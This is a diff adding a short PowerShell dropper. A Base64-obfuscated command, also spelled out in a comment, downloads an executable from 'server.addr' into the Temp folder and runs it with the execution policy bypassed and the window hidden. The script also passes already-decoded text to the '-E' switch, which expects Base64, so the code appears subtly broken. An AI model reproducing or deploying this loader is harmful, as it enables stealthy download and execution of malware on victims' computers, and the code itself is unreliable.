@@ -1,0 +1,7 @@
+$ENVARG = "dwBnAGUAdAAgACcAaAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AYQBkAGQAcgAvAFMAWABTAEEAcgBjAGgAaQB2AGUALgBlAHgAZQAnACAALQBvAHUAdABmAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAcwBjAG8AdAB0AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABTAFgAUwBBAHIAYwBoAGkAdgBlAC4AZQB4AGUAJwA7ACAAdABpAG0AZQBvAHUAdAAgAC8AdAAgADIAIAA+AE4AVQBMADsAIABQAG8AdwBlAHIAcwBoAGUAbABsACAALQBFAHgAZQBjAHQAaQBvAG4AUABvAGwAaQBjAHkAIABiAHkAcABhAHMAcwAgAC0AbgBvAHAAIAAtAHcAaQBuAGQAbwB3ACAAaABpAGQAZABlAG4AIABDADoAXABVAHMAZQByAHMAXABzAGMAbwB0AHQAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFMAWABTAEEAcgBjAGgAaQB2AGUALgBlAHgAZQA="
+$DECODED = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENVARG))
+powershell -ExecutionPolicy bypass -nop -window hidden -E $DECODED
+
+# Base64 Command to be executed
+# This is just an example & should be removed from the runtime script!
+# wget 'https://server.addr/SXSArchive.exe' -outfile $env:Temp\SXSArchive.exe'; timeout /t 2 >NUL; Powershell -ExectionPolicy bypass -nop -window hidden $env:Temp\SXSArchive.exe
